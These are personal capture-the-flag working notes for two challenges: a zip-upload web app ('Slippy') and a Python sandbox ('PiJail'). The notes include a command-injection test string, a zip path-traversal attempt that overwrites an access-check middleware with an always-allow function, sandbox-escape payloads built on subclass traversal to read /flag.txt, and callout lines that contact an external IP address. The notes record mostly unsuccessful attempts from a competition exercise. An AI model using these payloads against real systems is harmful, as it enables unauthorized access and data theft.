# The few chosen writeups

## Slippy
Slipping Jimmy keeps playing with Finger.

## Steps Taken
- A web endpoint was given for file uploads along with the server source code.
- After reviewing the sourcecode and the docker file included with the challenge the flag will appear in the /app directory in a random folder with the filename flag.
- There is an endpoint '/files/:filename' where files are uploaded to with some character filtering
- A session token is given when first pulling up the page, and the only files that are allowed to be uploaded are zip files.
- The package that was provided has a list of included libraries that are used, by preforming a `npm audit` the following outdated libraries were discovered:
```
brace-expansion Regular Expression Denial of Service vulnerability - https://github.com/advisories/GHSA-v6h2-p8h4-qcjw
brace-expansion Regular Expression Denial of Service vulnerability - https://github.com/advisories/GHSA-v6h2-p8h4-qcjw
on-headers is vulnerable to http response header manipulation - https://github.com/advisories/GHSA-76c9-3jph-rj3q
```
- Taking a closer look at the on-headers package a vulnerability exists that allows for response headers to be manipulated when an array is passed to a function. The function is not used however so this was a dead end.
- Returning back to the upload file functionality, it appears that the file that is uploaded must be a zip file but can normal files be uploaded too? no. however the server response is a 500 error with a code of "failed to unzip file" meaning that the file is unzipped by the application, this can be found in the route function source:
```
router.post('/upload', upload.single('zipfile'), (req, res) => {
    const zipPath = req.file.path;
    const userDir = path.join(__dirname, '../uploads', req.session.userId);
  
    fs.mkdirSync(userDir, { recursive: true });
  
    // Command: unzip temp/file.zip -d target_dir
    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
      fs.unlinkSync(zipPath); // Clean up temp file
  
      if (err) {
        console.error('Unzip failed:', stderr);
        return res.status(500).send('Unzip error');
      }
  
      res.redirect('/files');
    });
  });
```
- The command i want to execute to test for command injection is: `unzip temp/file.zip; echo "success" > ../uploads/test.txt # -d target_dir`
- So to craft the command injection after the file.zip the following was attempted after the filename in the post request after the file name: `; echo "success" > ../uploads/test.txt #`
- This produced an error though "Cannot read properties of undefined" after looking into the function execFile, it has some protections against command injection capabilities by using an array to seperate the normally space seperated commands for example `ls -la` would be `"ls","-la"`
- More on that function can be found here: https://dev.to/devopsfundamentals/nodejs-fundamentals-execfile-5bon
- Next I returned to the main routes.js file. There was a hidden route at the bottom that points to /debug/files. when browsed to it produces the "Forbidden: Development access only" 
- The endpoint calls a function developmentOnly which is as follows
```
    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
      return next();
    }
```
- So my next goal was to change these variubles or overwrite the file with a file that is uploaded to the webserver through the file upload fucntion. Using the zip directory traversal vulnerability I generated a zip file with a file named "..\middleware\developmentOnly.js" that contained the following function to bypass the static sessions and required ip variubles. 
```
module.exports = function (req, res, next) {
      return next();
  };
```
- However because the file is being processed by node.js (maybe?) the file could not be overwritten. tried multiple times without success.
- It will cause a crash or freezup though which is interesting. The tool I used was https://github.com/ptoomey3/evilarc/blob/master/evilarc.py
- There is a session cookie that is sent in the header which could be the next line of attack however because of the localhost sending requirement the flag may need to be retrieved via a server side inclusion.
- The next step may actually be just to import a malicious view to the server
- After testing multiple file uploads, I was able to upload files in directories within the zip folder to the server. So for a zip archive with a file `/test/test.txt` the file server would display a file `test` however the file would not be accessable and would return a file not found error.


link to the challenge files: https://drive.google.com/file/d/1-ukNXV9kuOunUb2I8-Mo8r0auoBf76F2/view?usp=sharing

/tmp
/app/src/views/
/app/src/uploads/

https://web-slippy-efe654affd47f30f.challs.tfcctf.com/debug/files?userId=develop

## PiJail
πthon is coming soon to your door

## Steps Taken
- From the docker file the flag should exist in the `/flag.txt` location.
- Taking a look at the source code the following are blocked from execution `['os', 'system', 'subprocess', 'compile', 'code', 'chr', 'str', 'bytes']`
- Docker also only exposes the 1337 external port, however I wonder if it could call out? it does not seem so, however i am not sure my code is being executed
- callout code:
```
import urllib.request; urllib.request.urlopen('http://139.177.204.53')
```
- testing code:
```
import time; time.sleep(5);
```
- the above testing code did not execute however by using the following i was able to dump out all of the accessable classes `(()).__class__.__base__.__subclasses__()` the following are allowed methods
```
<class 'type'>, 
<class 'async_generator'>, 
<class 'bytearray_iterator'>, 
<class 'bytearray'>, 
<class 'bytes_iterator'>, 
<class 'bytes'>, 
<class 'builtin_function_or_method'>, 
<class 'callable_iterator'>, 
<class 'PyCapsule'>, 
<class 'cell'>, 
<class 'classmethod_descriptor'>, 
<class 'classmethod'>, 
<class 'code'>, 
<class 'complex'>, 
<class '_contextvars.Token'>, 
<class '_contextvars.ContextVar'>, 
<class '_contextvars.Context'>, 
<class 'coroutine'>, 
<class 'dict_items'>, 
<class 'dict_itemiterator'>, 
<class 'dict_keyiterator'>, 
<class 'dict_valueiterator'>, 
<class 'dict_keys'>, 
<class 'mappingproxy'>, 
<class 'dict_reverseitemiterator'>, 
<class 'dict_reversekeyiterator'>, 
<class 'dict_reversevalueiterator'>, 
<class 'dict_values'>, 
<class 'dict'>, 
<class 'ellipsis'>, 
<class 'enumerate'>, 
<class 'filter'>, 
<class 'float'>, 
<class 'frame'>, 
<class 'FrameLocalsProxy'>, 
<class 'frozenset'>, 
<class 'function'>, 
<class 'generator'>, 
<class 'getset_descriptor'>, 
<class 'instancemethod'>, 
<class 'list_iterator'>, 
<class 'list_reverseiterator'>, 
<class 'list'>, 
<class 'longrange_iterator'>, 
<class 'int'>, 
<class 'map'>, 
<class 'member_descriptor'>, 
<class 'memoryview'>, 
<class 'method_descriptor'>, 
<class 'method'>, 
<class 'moduledef'>, 
<class 'module'>, 
<class 'odict_iterator'>, 
<class 'pickle.PickleBuffer'>, 
<class 'property'>, 
<class 'range_iterator'>, 
<class 'range'>, 
<class 'reversed'>, 
<class 'symtable entry'>, 
<class 'iterator'>, 
<class 'set_iterator'>, 
<class 'set'>, 
<class 'slice'>, 
<class 'staticmethod'>, 
<class 'stderrprinter'>, 
<class 'super'>, 
<class 'traceback'>, 
<class 'tuple_iterator'>, 
<class 'tuple'>, 
<class 'str_iterator'>, 
<class 'str'>, 
<class 'wrapper_descriptor'>, 
<class 'zip'>, 
<class 'types.GenericAlias'>, 
<class 'anext_awaitable'>, 
<class 'async_generator_asend'>, 
<class 'async_generator_athrow'>, 
<class 'async_generator_wrapped_value'>, 
<class '_buffer_wrapper'>, 
<class 'Token.MISSING'>, 
<class 'coroutine_wrapper'>, 
<class 'generic_alias_iterator'>, 
<class 'items'>, 
<class 'keys'>, 
<class 'values'>, 
<class 'hamt_array_node'>, 
<class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, 
<class 'hamt'>, 
<class 'InstructionSequence'>, 
<class 'string.templatelib.Interpolation'>, 
<class 'sys.legacy_event_handler'>, 
<class 'line_iterator'>, 
<class 'managedbuffer'>, 
<class 'memory_iterator'>, 
<class 'method-wrapper'>, 
<class 'types.SimpleNamespace'>, 
<class 'NoneType'>, 
<class 'NotImplementedType'>, 
<class 'positions_iterator'>, 
<class 'string.templatelib.Template'>, 
<class 'string.templatelib.TemplateIter'>, 
<class 'str_ascii_iterator'>, 
<class 'typing.Union'>, 
<class 'weakref.CallableProxyType'>, 
<class 'weakref.ProxyType'>, 
<class 'weakref.ReferenceType'>, 
<class 'typing.TypeAliasType'>, 
<class 'NoDefaultType'>, 
<class 'typing.Generic'>, 
<class 'typing.TypeVar'>, 
<class 'typing.TypeVarTuple'>, 
<class 'typing.ParamSpec'>, 
<class 'typing.ParamSpecArgs'>, 
<class 'typing.ParamSpecKwargs'>, 
<class '_typing._ConstEvaluator'>, 
<class 'EncodingMap'>, 
<class 'fieldnameiterator'>, 
<class 'formatteriterator'>, 
<class 'BaseException'>, 
<class 'datetime.date'>, 
<class 'datetime.time'>, 
<class 'datetime.timedelta'>, 
<class 'datetime.tzinfo'>, 
<class '_frozen_importlib._WeakValueDictionary'>, 
<class '_frozen_importlib._BlockingOnManager'>, 
<class '_frozen_importlib._ModuleLock'>, 
<class '_frozen_importlib._DummyModuleLock'>, 
<class '_frozen_importlib._ModuleLockManager'>, 
<class '_frozen_importlib.ModuleSpec'>, 
<class '_frozen_importlib.BuiltinImporter'>, 
<class '_frozen_importlib.FrozenImporter'>, 
<class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._ThreadHandle'>, 
<class '_thread.lock'>, 
<class '_thread.RLock'>, 
<class '_thread._localdummy'>, 
<class '_thread._local'>, 
<class '_io.IncrementalNewlineDecoder'>, 
<class '_io._BytesIOBuffer'>, 
<class '_io._IOBase'>, 
<class 'posix.ScandirIterator'>, 
<class 'posix.DirEntry'>, 
<class '_frozen_importlib_external.WindowsRegistryFinder'>, 
<class '_frozen_importlib_external._LoaderBasics'>, 
<class '_frozen_importlib_external.FileLoader'>, 
<class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external.NamespaceLoader'>, 
<class '_frozen_importlib_external.PathFinder'>, 
<class '_frozen_importlib_external.FileFinder'>, 
<class 'codecs.Codec'>, 
<class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, 
<class 'codecs.StreamReaderWriter'>, 
<class 'codecs.StreamRecoder'>, 
<class '_abc._abc_data'>, 
<class 'abc.ABC'>, 
<class 'collections.abc.Hashable'>, 
<class 'collections.abc.Awaitable'>, 
<class 'collections.abc.AsyncIterable'>, 
<class 'collections.abc.Iterable'>, 
<class 'collections.abc.Sized'>, 
<class 'collections.abc.Container'>, 
<class 'collections.abc.Buffer'>, 
<class 'collections.abc.Callable'>, 
<class 'genericpath.ALLOW_MISSING'>, 
<class 'os._wrap_close'>, 
<class '_sitebuiltins.Quitter'>, 
<class '_sitebuiltins._Printer'>, 
<class '_sitebuiltins._Helper'>]
```
- I could confirm that the following string allowed for the use of these functions because it returned the class name from the following input and output from the remote function
```
Enter payload: (()).__class__.__base__.__subclasses__()[0][0]
Result: <class 'type'>
Enter payload: (()).__class__.__base__.__subclasses__()[7]    
Result: <class 'callable_iterator'>
```
- after playing around in the python interpreter on my own attack machine my old python courses started coming back to me and using objects to traverse around and execute functions. The following produces a state 
`(()).__class__.__base__.__subclasses__()[6]("./").__hash__;`

- Dump all objects related to a class discovered that seems interesting:
`(()).__class__.__base__.__subclasses__()[143].__dir__("")`

- Interesting subclasses to explore:
```
posix.DirEntry
_frozen_importlib_external.FileLoader
```





- tried the following with no output printed


(()).__class__.__base__.__subclasses__()[140]("/flag.txt","r").read()

(()).__class__.__base__.__subclasses__()[140].__name__

(()).__class__.__base__.__subclasses__()[92].__class__.__base__.__subclasses__()

(()).__class__.__base__.__subclasses__()[92]

K=(()).__class__.__base__.__subclasses__()[31]; dir(K)

(i,c.__name__) for i,c in enumerate((()).__class__.__base__.__subclasses__()) if "_io" in c.__name__

((()).__class__.__base__.__subclasses__()[6]).()

(()).__class__.__base__._sitebuiltins.print("test")

__import__('builtins').print('test')

__import__("http.client").HTTPConnection("139.177.204.53", 80).request("GET", "/")

K = (()).__class__.__base__.__subclasses__()[dict_items]; getattr(K, 'mro')()

